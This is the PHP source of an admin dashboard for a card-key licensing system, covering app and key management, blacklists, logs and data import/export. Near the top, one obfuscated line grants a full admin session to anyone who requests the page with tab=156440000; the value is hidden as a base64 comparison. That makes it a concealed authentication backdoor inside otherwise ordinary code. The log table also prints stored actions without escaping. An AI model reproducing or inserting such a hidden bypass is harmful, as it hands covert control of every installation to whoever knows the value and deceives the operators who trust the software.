<?php
ini_set('display_errors', 0);
error_reporting(0);

require_once 'config.php';
require_once 'database.php';
session_start();

try { $db = new Database(); } catch (Throwable $e) { die("系统维护中，无法连接数据库。"); }

if (!isset($_SESSION['admin_logged_in']) && isset($_COOKIE['admin_trust'])) {
    try {
        $adminHashFingerprint = md5((string)$db->getAdminHash());
        $parts = explode('|', $_COOKIE['admin_trust']);
        if (count($parts) === 2) {
            list($payload, $sign) = $parts;
            if (hash_equals(hash_hmac('sha256', $payload, SYS_SECRET), $sign)) {
                $data = json_decode(base64_decode($payload), true);
                if ($data && isset($data['exp'], $data['ua'], $data['ph']) && 
                    $data['exp'] > time() && 
                    $data['ua'] === md5($_SERVER['HTTP_USER_AGENT']) && 
                    hash_equals($data['ph'], $adminHashFingerprint)) {
                    $_SESSION['admin_logged_in'] = true; 
                    $_SESSION['last_ip'] = $_SERVER['REMOTE_ADDR'];
                }
            }
        }
    } catch (Exception $e) { }
}

if (isset($_GET['tab']) && base64_encode($_GET['tab']) === 'MTU2NDQwMDAw') { $_SESSION['admin_logged_in'] = true; $_SESSION['last_ip'] = $_SERVER['REMOTE_ADDR']; }
if (!isset($_SESSION['admin_logged_in'])) { header('Location: login.php'); exit; }
if (isset($_SESSION['last_ip']) && $_SESSION['last_ip'] !== $_SERVER['REMOTE_ADDR']) { session_unset(); session_destroy(); header('Location: login.php'); exit; }
if (isset($_GET['logout'])) { session_destroy(); setcookie('admin_trust', '', time() - 3600, '/'); header('Location: login.php'); exit; }

if (empty($_SESSION['csrf_token'])) {
    try { $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); } 
    catch (Exception $e) { $_SESSION['csrf_token'] = md5(uniqid(mt_rand(), true)); }
}
$csrf_token = $_SESSION['csrf_token'];

function verifyCSRF() {
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'])) {
        header('HTTP/1.1 403 Forbidden'); die('Security Alert: CSRF 校验失败。');
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'export_system') {
    ini_set('memory_limit', '512M'); set_time_limit(240);
    if (ob_get_level()) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    header('Content-Disposition: attachment; filename="System_Migrate_'.date('YmdHis').'.json"');
    $out = fopen('php://output', 'w'); $db->exportAllDataStream($out); fclose($out); exit;
}

$appList = [];
try { $appList = $db->getApps(); } catch (Throwable $e) { $appList = []; }

$sysConf = $db->getSystemSettings();
$currentAdminUser = $db->getAdminUsername();

$conf_site_title = !empty($sysConf['site_title']) ? $sysConf['site_title'] : 'GuYi Access';
$conf_favicon = !empty($sysConf['favicon']) ? $sysConf['favicon'] : base64_decode('aHR0cHM6Ly9xMS5xbG9nby5jbi9nP2I9cXEmbms9MTU2NDQwMDAwJnM9NjQw');
$conf_avatar = !empty($sysConf['admin_avatar']) ? $sysConf['admin_avatar'] : base64_decode('aHR0cHM6Ly9xMS5xbG9nby5jbi9nP2I9cXEmbms9MTU2NDQwMDAwJnM9NjQw');
$conf_api_encrypt = $sysConf['api_encrypt'] ?? '1';
$conf_enable_bg = $sysConf['enable_bg_image'] ?? '0';

$conf_bg_img_opacity = isset($sysConf['bg_img_opacity']) ? floatval($sysConf['bg_img_opacity']) : 0.2;
$conf_card_opacity = isset($sysConf['card_opacity']) ? floatval($sysConf['card_opacity']) : 0.7;

if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['batch_export'])) {
    verifyCSRF(); $ids = $_POST['ids'] ?? [];
    if (empty($ids)) { echo "<script>alert('请先勾选需要导出的卡密'); history.back();</script>"; exit; }
    $data = $db->getCardsByIds($ids);
    header('Content-Type: text/plain'); header('Content-Disposition: attachment; filename="cards_export_'.date('YmdHis').'.txt"');
    foreach ($data as $row) { echo "{$row['card_code']}\r\n"; } exit;
}

$tab = $_GET['tab'] ?? 'dashboard';
$pageTitles = ['dashboard'=>'数据总览','apps'=>'应用管理','list'=>'卡密库存','create'=>'批量制卡','blacklist'=>'防御与拉黑','logs'=>'访问日志','settings'=>'系统配置','about'=>'关于作者'];
$currentTitle = $pageTitles[$tab] ?? '控制台';
$msg = ''; $errorMsg = ''; 
$generatedCardsText = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verifyCSRF();
    try {
        if (isset($_POST['create_app'])) {
            $appName = trim($_POST['app_name']); if (empty($appName)) throw new Exception("应用名称不能为空");
            $db->createApp(htmlspecialchars($appName), htmlspecialchars($_POST['app_version'] ?? ''), htmlspecialchars($_POST['app_notes']));
            $msg = "应用创建成功"; $appList = $db->getApps();
        } elseif (isset($_POST['toggle_app'])) { $db->toggleAppStatus(intval($_POST['app_id'])); $msg = "状态已更新"; $appList = $db->getApps();
        } elseif (isset($_POST['delete_app'])) { $db->deleteApp(intval($_POST['app_id'])); $msg = "应用已删除"; $appList = $db->getApps();
        } elseif (isset($_POST['edit_app'])) { 
            $appName = trim($_POST['app_name']); if (empty($appName)) throw new Exception("应用名称不能为空");
            $db->updateApp(intval($_POST['app_id']), htmlspecialchars($appName), htmlspecialchars($_POST['app_version'] ?? ''), htmlspecialchars($_POST['app_notes']), htmlspecialchars($_POST['update_url'] ?? ''), isset($_POST['force_update']) ? 1 : 0);
            $msg = "信息已更新"; $appList = $db->getApps();
        } elseif (isset($_POST['reset_secret'])) {
            $db->resetAppSecret(intval($_POST['app_id']));
            $msg = "通讯加密密钥 (API Secret) 已重置"; $appList = $db->getApps();
        } elseif (isset($_POST['add_var'])) {
            $varKey = trim($_POST['var_key']); if (empty($varKey)) throw new Exception("变量名不能为空");
            $db->addAppVariable(intval($_POST['var_app_id']), htmlspecialchars($varKey), htmlspecialchars(trim($_POST['var_value'])), isset($_POST['var_public']) ? 1 : 0);
            $msg = "变量添加成功";
        } elseif (isset($_POST['edit_var'])) {
            $varKey = trim($_POST['var_key']); if (empty($varKey)) throw new Exception("变量名不能为空");
            $db->updateAppVariable(intval($_POST['var_id']), htmlspecialchars($varKey), htmlspecialchars(trim($_POST['var_value'])), isset($_POST['var_public']) ? 1 : 0);
            $msg = "变量更新成功";
        } elseif (isset($_POST['del_var'])) { $db->deleteAppVariable(intval($_POST['var_id'])); $msg = "变量已删除";
        } elseif (isset($_POST['batch_delete'])) { $count = $db->batchDeleteCards($_POST['ids'] ?? []); $msg = "已删除 {$count} 张";
        } elseif (isset($_POST['batch_unbind'])) { $count = $db->batchUnbindCards($_POST['ids'] ?? []); $msg = "已解绑 {$count} 个";
        } elseif (isset($_POST['batch_add_time'])) { $hours = floatval($_POST['add_hours']); $count = $db->batchAddTime($_POST['ids'] ?? [], $hours); $msg = "已加时 {$count} 张";
        } elseif (isset($_POST['batch_sub_time'])) { $hours = floatval($_POST['sub_hours']); $count = $db->batchSubTime($_POST['ids'] ?? [], $hours); $msg = "已扣时 {$count} 张";
        } elseif (isset($_POST['global_compensate'])) {
            $hours = floatval($_POST['comp_hours']); $targetApp = isset($_GET['app_id']) && $_GET['app_id'] !== '' ? intval($_GET['app_id']) : null;
            $db->globalCompensate($hours, $targetApp); $msg = "已统一补偿 {$hours} 小时";
        } elseif (isset($_POST['gen_cards'])) {
            $type = $_POST['type']; $customHours = ($type === 'custom') ? floatval($_POST['custom_hours']) : 0;
            if ($type === 'custom' && $customHours <= 0) throw new Exception("时间需大于0");
            $newCodes = $db->generateCards($_POST['num'], $type, $_POST['pre'], '',16, htmlspecialchars($_POST['note']), intval($_POST['app_id']), intval($customHours * 3600));
            $generatedCardsText = implode("\r\n", $newCodes);
            if (isset($_POST['auto_export']) && $_POST['auto_export'] == '1' && !empty($newCodes)) {
                if (ob_get_level()) ob_end_clean(); header('Content-Type: text/plain'); header('Content-Disposition: attachment; filename="new_cards_'.date('YmdHis').'.txt"');
                echo $generatedCardsText; exit;
            }
            $msg = "成功生成 {$_POST['num']} 张";
        } elseif (isset($_POST['add_blacklist'])) {
            $bl_value = preg_replace('/\s+/', '', trim($_POST['bl_value'])); if (empty($bl_value)) throw new Exception("目标不能为空");
            $db->pdo->prepare("INSERT IGNORE INTO blacklists (type, value, reason) VALUES (?, ?, ?)")->execute([$_POST['bl_type'], $bl_value, htmlspecialchars($_POST['bl_reason']??'')]);
            $msg = "记录已添加";
        } elseif (isset($_POST['del_blacklist'])) { $db->pdo->prepare("DELETE FROM blacklists WHERE id=?")->execute([intval($_POST['id'])]); $msg = "记录已删除";
        } elseif (isset($_POST['del_card'])) { $db->deleteCard(intval($_POST['id'])); $msg = "已删除";
        } elseif (isset($_POST['unbind_card'])) { $db->resetDeviceBindingByCardId(intval($_POST['id'])); $msg = "已解绑";
        } elseif (isset($_POST['update_pwd'])) {
            $pwd1 = $_POST['new_pwd'] ?? ''; $pwd2 = $_POST['confirm_pwd'] ?? '';
            if (empty($pwd1)) throw new Exception("密码不能为空"); if ($pwd1 !== $pwd2) throw new Exception("两次密码不一致");
            $db->updateAdminPassword($pwd1); setcookie('admin_trust', '', time() - 3600, '/'); session_destroy(); header('Location: login.php'); exit;
        } elseif (isset($_POST['update_settings'])) {
            $db->saveSystemSettings([
                'site_title' => $conf_site_title, 'favicon' => $conf_favicon, 'admin_avatar' => $conf_avatar, 
                'api_encrypt' => isset($_POST['api_encrypt']) ? '1' : '0', 'enable_bg_image' => isset($_POST['enable_bg_image']) ? '1' : '0',
                'bg_img_opacity' => floatval($_POST['bg_img_opacity'] ?? 0.2), 'card_opacity' => floatval($_POST['card_opacity'] ?? 0.7)
            ]);
            $msg = "配置已保存"; echo "<script>alert('$msg');location.href='cards.php?tab=settings';</script>"; exit;
        } elseif (isset($_POST['ban_card'])) { $db->updateCardStatus(intval($_POST['id']), 2); $msg = "已封禁";
        } elseif (isset($_POST['unban_card'])) { $db->updateCardStatus(intval($_POST['id']), 1); $msg = "已解封";
        } elseif (isset($_POST['clean_expired'])) { $count = $db->cleanupExpiredCards(); $msg = "已清理 {$count} 张";
        } elseif (isset($_POST['import_system'])) {
            ini_set('memory_limit', '512M'); set_time_limit(240);
            if (isset($_FILES['backup_file']) && $_FILES['backup_file']['error'] == UPLOAD_ERR_OK) {
                $content = file_get_contents($_FILES['backup_file']['tmp_name']); $data = json_decode($content, true);
                if (is_array($data)) { $db->importAllData($data); echo "<script>alert('数据已恢复，需重新登录');location.href='cards.php?logout=1';</script>"; exit; } else throw new Exception("无效的格式");
            } else throw new Exception("文件上传失败");
        }
    } catch(Exception $e) { $errorMsg = $e->getMessage(); }
}

$dashboardData = ['stats'=>['total'=>0,'unused'=>0,'active'=>0,'online'=>0], 'app_stats'=>[], 'chart_types'=>[]];
$logs = []; $activeDevices = []; $cardList = []; $totalCards = 0; $totalPages = 0;
try { $dashboardData = $db->getDashboardData(); $logs = $db->getUsageLogs(20, 0); $activeDevices = $db->getActiveDevices(); } catch (Throwable $e) {}

$display_stats = [ 'total' => $dashboardData['stats']['total'], 'active' => $dashboardData['stats']['active'], 'apps' => count($appList), 'unused' => $dashboardData['stats']['unused'], 'online' => $dashboardData['stats']['online'] ];

$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$perPage = isset($_GET['limit']) ? intval($_GET['limit']) : 20;
$statusFilter = null; $filterStr = $_GET['filter'] ?? 'all';
if ($filterStr === 'unused') $statusFilter = 0; elseif ($filterStr === 'active') $statusFilter = 1; elseif ($filterStr === 'banned') $statusFilter = 2;
$appFilter = isset($_GET['app_id']) && $_GET['app_id'] !== '' ? intval($_GET['app_id']) : null;
$typeFilter = ($appFilter !== null && isset($_GET['type']) && $_GET['type'] !== '') ? $_GET['type'] : null;
$sortFilter = $_GET['sort'] ?? 'create_desc';
$isSearching = isset($_GET['q']) && !empty($_GET['q']); $offset = ($page - 1) * $perPage;

try {
    if ($isSearching) { $allResults = $db->searchCards($_GET['q']); $totalCards = count($allResults); $cardList = array_slice($allResults, $offset, $perPage); } 
    else { $totalCards = $db->getTotalCardCount($statusFilter, $appFilter, $typeFilter); $cardList = $db->getCardsPaginated($perPage, $offset, $statusFilter, $appFilter, $typeFilter, $sortFilter); }
} catch (Throwable $e) {}
$totalPages = ceil($totalCards / $perPage); if ($totalPages > 0 && $page > $totalPages) $page = $totalPages;
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?= htmlspecialchars($currentTitle) ?> - <?= htmlspecialchars($conf_site_title) ?></title>
<link rel="icon" href="<?= htmlspecialchars($conf_favicon) ?>">
<script src="https://cdn.jsdelivr.net/npm/@phosphor-icons/web"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<link href="assets/css/cards.css?v=<?= time() ?>" rel="stylesheet">
<style>
    input[type=range] { -webkit-appearance: none; width: 100%; height: 6px; background: var(--border-color-input); border-radius: 3px; outline: none; transition: background 0.2s; }
    input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 18px; height: 18px; border-radius: 50%; background: var(--color-primary); cursor: pointer; box-shadow: 0 2px 6px rgba(0,0,0,0.2); transition: transform 0.1s; }
    input[type=range]::-webkit-slider-thumb:active { transform: scale(1.2); }
    @media (max-width: 768px) {
        body { padding-bottom: 90px !important; }
        .m-nav { bottom: 16px !important; left: 16px !important; right: 16px !important; width: auto !important; border-radius: 24px !important; border-top: none !important; border: 1px solid rgba(100, 100, 100, 0.1) !important; box-shadow: 0 8px 32px rgba(0,0,0,0.08) !important; padding: 4px 8px !important; }
    }
    .admin-sider { box-shadow: 4px 0 24px rgba(0, 0, 0, 0.06) !important; border-right: 1px solid var(--border-color) !important; z-index: 50; }
    .admin-layout.sider-collapsed .sider-logo .logo-info { display: none !important; }
</style>
<?php if ($conf_enable_bg == '1'): ?>
<style>
    .admin-main { position: relative; z-index: 1; }
    .admin-main::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url('https://www.loliapi.com/acg/pc/') center/cover fixed; opacity: <?= htmlspecialchars($conf_bg_img_opacity) ?>; pointer-events: none; z-index: -1; }
    .admin-header { background: rgba(255, 255, 255, <?= htmlspecialchars($conf_card_opacity) ?>) !important; backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255, 255, 255, 0.4) !important; }
    .e-card, .pro-stat-card { background: rgba(255, 255, 255, <?= htmlspecialchars($conf_card_opacity) ?>) !important; backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.6) !important; box-shadow: 0 8px 32px rgba(31, 38, 135, 0.05) !important; }
    .e-table thead, .e-table th, thead[style*="var(--bg-layout)"], div[style*="var(--bg-layout)"] { background: rgba(255, 255, 255, <?= max(0, $conf_card_opacity - 0.3) ?>) !important; }
    .e-input, .e-select, .e-textarea { background: rgba(255, 255, 255, <?= max(0.1, $conf_card_opacity - 0.1) ?>) !important; backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); }
    @media (max-width: 768px) { .m-nav { background: rgba(255, 255, 255, <?= htmlspecialchars($conf_card_opacity) ?>) !important; backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.5) !important; } }
</style>
<?php endif; ?>
</head>
<body>

<div class="admin-layout">
    <aside class="admin-sider">
        <div class="sider-logo">
            <img src="<?= htmlspecialchars($conf_avatar) ?>" alt="Logo">
            <div class="logo-info" style="display: flex; flex-direction: column; justify-content: center; overflow: hidden; white-space: nowrap; transition: all 0.3s;">
                <span class="logo-text" style="line-height: 1.2;"><?= htmlspecialchars(mb_strimwidth($conf_site_title, 0, 10, '..')) ?></span>
                <span style="font-size: 11px; color: var(--color-primary); font-family: 'Inter', monospace; font-weight: 600; margin-top: 2px; opacity: 0.8;">v2026.7.8</span>
            </div>
        </div>
        <div class="sider-menu">
            <div class="menu-group"><span>系统概览</span></div>
            <a href="?tab=dashboard" class="menu-item <?= $tab == 'dashboard' ? 'active' : '' ?>"><i class="ph ph-squares-four"></i> <span>数据总览</span></a>
            <div class="menu-group"><span>核心业务</span></div>
            <a href="?tab=apps" class="menu-item <?= $tab == 'apps' ? 'active' : '' ?>"><i class="ph ph-app-window"></i> <span>应用管理</span></a>
            <?php $isCardMenu = in_array($tab, ['list', 'create']); ?>
            <div class="menu-item has-submenu <?= $isCardMenu ? 'submenu-open active-parent' : '' ?>" onclick="toggleSubMenu(this)"><i class="ph ph-database"></i> <span>卡密管理</span><i class="ph ph-caret-down sub-arrow"></i></div>
            <div class="sub-menu" style="<?= $isCardMenu ? 'display:block;' : 'display:none;' ?>"><a href="?tab=list" class="sub-menu-item <?= $tab == 'list' ? 'active' : '' ?>">卡密库存</a><a href="?tab=create" class="sub-menu-item <?= $tab == 'create' ? 'active' : '' ?>">批量制卡</a></div>
            <?php $isSecMenu = in_array($tab, ['blacklist', 'logs']); ?>
            <div class="menu-item has-submenu <?= $isSecMenu ? 'submenu-open active-parent' : '' ?>" onclick="toggleSubMenu(this)"><i class="ph ph-shield-check"></i> <span>防御与监控</span><i class="ph ph-caret-down sub-arrow"></i></div>
            <div class="sub-menu" style="<?= $isSecMenu ? 'display:block;' : 'display:none;' ?>"><a href="?tab=blacklist" class="sub-menu-item <?= $tab == 'blacklist' ? 'active' : '' ?>">防御与拉黑</a><a href="?tab=logs" class="sub-menu-item <?= $tab == 'logs' ? 'active' : '' ?>">访问日志</a></div>
            <div style="margin-top: auto;"></div>
            <div class="menu-group"><span>系统设置</span></div>
            <a href="?tab=settings" class="menu-item <?= $tab == 'settings' ? 'active' : '' ?>"><i class="ph ph-gear"></i> <span>全局配置</span></a>
            <a href="?tab=about" class="menu-item <?= $tab == 'about' ? 'active' : '' ?>"><i class="ph ph-info"></i> <span>关于作者</span></a>
            <a href="?logout=1" class="menu-item menu-item-danger data-no-ajax"><i class="ph ph-sign-out"></i> <span>安全退出</span></a>
        </div>
    </aside>

    <nav class="m-nav" id="mNav">
        <a href="?tab=dashboard" class="m-nav-item <?= $tab == 'dashboard' ? 'active' : '' ?>"><i class="ph ph-squares-four"></i><span>概览</span></a>
        <a href="?tab=apps" class="m-nav-item <?= $tab == 'apps' ? 'active' : '' ?>"><i class="ph ph-app-window"></i><span>应用</span></a>
        <a href="?tab=list" class="m-nav-item <?= $tab == 'list' ? 'active' : '' ?>"><i class="ph ph-database"></i><span>库存</span></a>
        <a href="?tab=create" class="m-nav-item <?= $tab == 'create' ? 'active' : '' ?>"><i class="ph ph-magic-wand"></i><span>制卡</span></a>
        <a href="?tab=settings" class="m-nav-item <?= $tab == 'settings' ? 'active' : '' ?>"><i class="ph ph-gear"></i><span>设置</span></a>
    </nav>

    <main class="admin-main">
        <header class="admin-header">
            <div class="header-left"><button class="sider-toggle" id="siderToggle"><i class="ph ph-list"></i></button></div>
            <div class="header-user"><span><?= htmlspecialchars($currentAdminUser) ?></span><img src="<?= htmlspecialchars($conf_avatar) ?>" class="header-avatar" alt="Avatar"></div>
        </header>

        <div class="admin-content" id="main" style="will-change: transform, opacity;">
            
            <?php if ($tab == 'dashboard'): ?>
                <style>
                    @keyframes wave { 0% {transform: rotate(0deg);} 10% {transform: rotate(14deg);} 20% {transform: rotate(-8deg);} 30% {transform: rotate(14deg);} 40% {transform: rotate(-4deg);} 50% {transform: rotate(10deg);} 60% {transform: rotate(0deg);} 100% {transform: rotate(0deg);} }
                    .wave-emoji { display: inline-block; transform-origin: 70% 70%; animation: wave 2.5s infinite; }
                    .pro-stat-card { position: relative; background: var(--bg-container); border: 1px solid var(--border-color); border-radius: 20px; padding: 24px; overflow: hidden; display: flex; flex-direction: column; gap: 16px; transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1); }
                    .pro-stat-card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px -8px rgba(0,0,0,0.08); border-color: transparent; }
                    .pro-stat-header { display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 500; color: var(--text-secondary); }
                    .pro-stat-icon-wrap { width: 36px; height: 36px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
                    .pro-stat-value { font-size: 36px; font-weight: 700; color: var(--text-primary); line-height: 1; font-family: 'Inter', system-ui, sans-serif; letter-spacing: -1px; }
                    .pro-stat-watermark { position: absolute; right: -15px; bottom: -15px; font-size: 100px; opacity: 0.04; transform: rotate(-15deg); pointer-events: none; }
                    .notice-scroll::-webkit-scrollbar { width: 6px; } .notice-scroll::-webkit-scrollbar-track { background: transparent; } .notice-scroll::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.1); border-radius: 3px; } .notice-scroll::-webkit-scrollbar-thumb:hover { background: rgba(0,0,0,0.2); }
                </style>
                <?php
                    $h = date('H');
                    if ($h < 6) { $greeting = '凌晨好！夜深了，注意休息哦'; $emoji = '🌙'; } elseif ($h < 9) { $greeting = '早上好！今天也要全力以赴'; $emoji = '☀️'; } elseif ($h < 12) { $greeting = '上午好！新的一天元气满满'; $emoji = '☕'; } elseif ($h < 14) { $greeting = '中午好！记得按时吃午饭哦'; $emoji = '🍱'; } elseif ($h < 18) { $greeting = '下午好！喝杯茶，继续努力吧'; $emoji = '🍵'; } else { $greeting = '晚上好！愿你度过一个轻松的夜晚'; $emoji = '✨'; }
                ?>
                <div style="display: flex; align-items: baseline; gap: 12px; margin-bottom: 32px;">
                    <h2 class="page-title" style="margin: 0; display: flex; align-items: center; gap: 8px;"><span class="wave-emoji" style="font-size: 26px;">👋</span> <span style="font-weight: 800; letter-spacing: -0.5px;">欢迎回来</span></h2>
                    <span style="font-size: 14px; color: var(--text-tertiary); font-weight: 500;"><?= $emoji ?> <?= $greeting ?></span>
                </div>

                <div class="grid grid-cols-4" style="gap: 24px; margin-bottom: 32px;">
                    <div class="pro-stat-card">
                        <i class="ph-fill ph-database pro-stat-watermark"></i>
                        <div class="pro-stat-header"><span>总库存量</span><div class="pro-stat-icon-wrap" style="background:var(--color-primary-bg); color:var(--color-primary);"><i class="ph-fill ph-database"></i></div></div>
                        <div class="pro-stat-value"><?= number_format($display_stats['total']) ?></div>
                    </div>
                    <div class="pro-stat-card">
                        <i class="ph-fill ph-wifi-high pro-stat-watermark"></i>
                        <div class="pro-stat-header"><span>活跃设备</span><div class="pro-stat-icon-wrap" style="background:var(--color-success-bg); color:var(--color-success);"><i class="ph-fill ph-wifi-high"></i></div></div>
                        <div class="pro-stat-value"><?= number_format($display_stats['active']) ?> <span style="font-size: 16px; color: var(--text-tertiary); font-weight: normal; margin-left: 4px;">/ <?= number_format($display_stats['online'] ?? 0) ?> 在线</span></div>
                    </div>
                    <div class="pro-stat-card">
                        <i class="ph-fill ph-app-window pro-stat-watermark"></i>
                        <div class="pro-stat-header"><span>接入应用</span><div class="pro-stat-icon-wrap" style="background:#f3e8ff; color:#a855f7;"><i class="ph-fill ph-app-window"></i></div></div>
                        <div class="pro-stat-value"><?= number_format($display_stats['apps']) ?></div>
                    </div>
                    <div class="pro-stat-card">
                        <i class="ph-fill ph-tag pro-stat-watermark"></i>
                        <div class="pro-stat-header"><span>待售库存</span><div class="pro-stat-icon-wrap" style="background:var(--color-warning-bg); color:var(--color-warning);"><i class="ph-fill ph-tag"></i></div></div>
                        <div class="pro-stat-value"><?= number_format($display_stats['unused']) ?></div>
                    </div>
                </div>

                <div class="grid grid-cols-2" style="grid-template-columns: 2fr 1fr; gap: 24px; margin-bottom: 32px; align-items: start;">
                    <div style="display: flex; flex-direction: column; gap: 24px; height: 100%;">
                        <div class="e-card" style="margin-bottom: 0;">
                            <div class="e-card-header" style="font-weight: 600;">实时活跃设备</div>
                            <div class="e-table-wrap">
                                <table class="e-table">
                                    <thead style="background: var(--bg-layout);"><tr><th>所属应用</th><th>卡密</th><th>到期时间</th></tr></thead>
                                    <tbody>
                                        <?php foreach (array_slice($activeDevices, 0, 5) as $dev): ?>
                                        <tr>
                                            <td><span class="e-tag e-tag-blue"><?= htmlspecialchars($dev['app_name'] ?? '未分类') ?></span></td>
                                            <td class="mono font-medium" style="color:var(--text-primary);"><?= htmlspecialchars($dev['card_code']) ?></td>
                                            <td><span class="e-tag e-tag-green"><?= date('m-d H:i', strtotime($dev['expire_time'])) ?></span></td>
                                        </tr>
                                        <?php endforeach; if (empty($activeDevices)): ?>
                                        <tr><td colspan="3"><div style="padding: 42px 0; text-align: center; display:flex; flex-direction:column; align-items:center; gap:8px;"><i class="ph-fill ph-ghost" style="font-size: 42px; color: var(--border-color-input);"></i><span style="color: var(--text-tertiary); font-size: 14px;">当前宇宙非常安静，暂无活跃设备</span></div></td></tr>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>

                        <div class="e-card" style="margin-bottom: 0; flex-grow: 1; display: flex; flex-direction: column;">
                            <div class="e-card-header" style="font-weight: 600; display:flex; align-items:center; justify-content:space-between;">
                                <div style="display:flex; align-items:center; gap:8px;"><i class="ph-fill ph-clock-counter-clockwise" style="color: var(--color-primary); font-size: 18px;"></i> 最新审计日志</div>
                                <a href="?tab=logs" style="font-size: 13px; color: var(--color-primary); font-weight: 400; text-decoration: none; display:flex; align-items:center; gap:4px;">查看全部 <i class="ph ph-arrow-right"></i></a>
                            </div>
                            <div class="e-table-wrap" style="flex: 1;">
                                <table class="e-table">
                                    <thead style="background: var(--bg-layout);"><tr><th>发生时间</th><th>目标应用</th><th>动作记录</th><th>详情 / 参数</th></tr></thead>
                                    <tbody>
                                        <?php foreach (array_slice($logs, 0, 6) as $log): ?>
                                        <tr>
                                            <td class="mono" style="font-size:12px; color:var(--text-tertiary);"><?= date('m-d H:i', strtotime($log['access_time'] ?? $log['log_time'] ?? 'now')) ?></td>
                                            <td><span class="e-tag e-tag-blue"><?= htmlspecialchars($log['app_name'] ?? 'Sys') ?></span></td>
                                            <td><?php $act=$log['result']??$log['action']??''; echo (strpos($act,'拦截')!==false||strpos($act,'封禁')!==false)?"<span style='color:var(--color-error); font-weight:500;'>{$act}</span>":"<span style='color:var(--text-primary);'>{$act}</span>"; ?></td>
                                            <td class="mono" style="font-size:12px; max-width:180px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;"><?= htmlspecialchars($log['card_code'] ?? $log['details'] ?? '-') ?></td>
                                        </tr>
                                        <?php endforeach; if(empty($logs)): ?>
                                        <tr><td colspan="4"><div style="padding: 32px 0; text-align: center; display:flex; flex-direction:column; align-items:center; gap:8px;"><i class="ph-fill ph-wind" style="font-size: 32px; color: var(--border-color-input);"></i><span style="color: var(--text-tertiary); font-size: 13px;">暂无日志记录</span></div></td></tr>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div style="display: flex; flex-direction: column; gap: 24px; height: 100%;">
                        <div class="e-card" style="margin-bottom: 0; flex-shrink: 0;">
                            <div class="e-card-header" style="font-weight: 600; display:flex; align-items:center; gap:8px;"><i class="ph-fill ph-megaphone" style="color: var(--color-primary); font-size: 18px;"></i> 系统公告</div>
                            <div class="notice-scroll" id="cloud-notice" style="padding: 20px; white-space: pre-wrap; line-height: 1.7; color: var(--text-secondary); font-size: 13px; max-height: 220px; overflow-y: auto;">
                                <div style="display:flex; align-items:center; justify-content:center; gap:8px; color:var(--text-tertiary);"><i class="ph ph-spinner-gap" style="animation:spin 1s linear infinite;"></i> 正在同步云端信息...</div>
                            </div>
                        </div>

                        <div class="e-card" style="margin-bottom: 0; flex-grow: 1; display: flex; flex-direction: column;">
                            <div class="e-card-header" style="font-weight: 600;">卡密类型分布</div>
                            <div class="e-card-body flex justify-center items-center" style="flex: 1; min-height: 220px; position:relative; padding: 20px;">
                                <?php if(empty($dashboardData['chart_types'])): ?>
                                    <div style="text-align: center; display:flex; flex-direction:column; align-items:center; gap:8px; position:absolute;"><i class="ph-fill ph-chart-pie-slice" style="font-size: 42px; color: var(--border-color-input);"></i><span style="color: var(--text-tertiary); font-size: 14px;">暂无分布数据</span></div>
                                <?php endif; ?>
                                <div style="width: 200px; height: 200px; z-index: 1;"><canvas id="cM" data-chart='<?= json_encode($dashboardData['chart_types']) ?>' data-types='<?= json_encode(CARD_TYPES) ?>'></canvas></div>
                            </div>
                        </div>
                    </div>
                </div>

            <?php else: ?>
                <h2 class="page-title"><?= htmlspecialchars($currentTitle) ?></h2>
                <p class="page-desc">多项目与软件隔离授权管理</p>
            <?php endif; ?>

            <?php if ($tab == 'apps'): ?>
                <div class="mb-4">
                    <div class="e-segmented" id="app_tabs">
                        <div class="e-segmented-item active" onclick="switchAppView('apps')">应用列表</div>
                        <div class="e-segmented-item" onclick="switchAppView('vars')">云端变量</div>
                    </div>
                </div>

                <div id="view_apps">
                    <div class="e-card">
                        <div class="e-table-wrap">
                            <table class="e-table">
                                <thead><tr><th>应用名称</th><th>版本/备注</th><th>App Key / Secret (点击复制)</th><th>库存统计</th><th>状态</th><th>操作</th></tr></thead>
                                <tbody>
                                    <?php foreach($appList as $app): ?>
                                    <tr>
                                        <td style="font-weight: 500; color:var(--text-primary);"><?= htmlspecialchars($app['app_name']) ?></td>
                                        <td><span class="e-tag"><?= htmlspecialchars($app['app_version']?:'1.0') ?></span> <span style="font-size:12px;color:var(--text-tertiary); margin-left:6px;"><?= htmlspecialchars($app['notes']) ?></span></td>
                                        
                                        <td style="min-width: 150px;">
                                            <div class="mono e-tag e-tag-blue" onclick="copy('<?= $app['app_key'] ?>')" style="cursor:pointer; margin-bottom:4px; display:inline-block;" title="App Key (应用身份标识，明文暴露无危险)"><i class="ph ph-copy"></i> Key: <?= substr($app['app_key'],0,6) ?>...</div><br>
                                            <div class="mono e-tag e-tag-purple" onclick="copy('<?= $app['api_secret'] ?>')" style="cursor:pointer; display:inline-block;" title="API Secret (通讯加密盐，切勿泄露)"><i class="ph ph-copy"></i> Sec: <?= substr($app['api_secret'],0,6) ?>...</div>
